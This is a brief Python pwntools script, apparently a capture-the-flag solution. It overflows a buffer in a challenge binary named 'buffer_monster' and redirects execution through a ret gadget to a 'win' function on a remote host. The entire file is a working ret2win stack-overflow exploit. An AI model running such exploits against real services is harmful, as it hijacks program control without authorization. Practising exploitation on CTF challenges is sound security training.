from pwn import *

payload = b"y"*9
payload += b'\x00'
payload += b"y"*126

payload += p64(0x0040125c) # ret
payload += p64(0x00401186) # win

#io = process("./buffer_monster")
io = remote("172.31.94.166", 5000)

#gdb.attach(io)
io.recvline()
io.sendline(payload)

io.interactive()
